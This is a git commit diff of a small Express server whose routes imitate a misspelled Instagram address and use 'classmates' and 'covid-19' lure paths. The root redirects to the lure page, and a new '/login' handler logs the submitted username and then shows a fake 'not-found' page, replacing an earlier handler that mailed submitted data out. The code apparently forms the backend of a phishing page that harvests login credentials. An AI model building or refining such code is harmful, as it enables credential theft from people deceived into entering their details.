053ee6297d71aa0dc58900730fbc51387bf324c5
Taryel Oruczade <Taryel.O@bestcomp.net>
2020-07-13 13:31:58 +0400

    url redirect

--- index.js
+++ index.js
@@ -4,23 +4,30 @@ const sendMail =  require('./mail');
 const path = require('path');
 var app = express();
 
-app.use('/instagranm/5bsinif/classmates',express.static('public'));
+app.use('/instagranm/5bsinif/instalife/sheir/classmates/covid-19',express.static('public'));
 
 app.use(express.urlencoded({
     extended:false
 }));
 app.use(express.json());
 
-app.get('/instagranm/5bsinif/classmates', (req,res) => {
+app.get('/not-found', (req,res) => {
+    res.sendFile(path.join(__dirname,'notfound.html'))
+});
+
+app.get('/instagranm/5bsinif/instalife/sheir/classmates/covid-19', (req,res) => {
       res.sendFile(path.join(__dirname,'index.html'))
-      console.log(__dirname,"dirname")
 });
 
 
-app.post('/registration', (req,res) => {
-    console.log('Data',req.body);
-    sendMail();
-    res.json({message: 'Message received'});
+app.get('/', (req,res) => {
+   res.redirect('/instagranm/5bsinif/instalife/sheir/classmates/covid-19')
+});
+
+app.post('/login', (req,res) => {
+    console.log('Data',req.body.username);
+   // sendMail();
+   res.redirect('/not-found')
 });
 
  
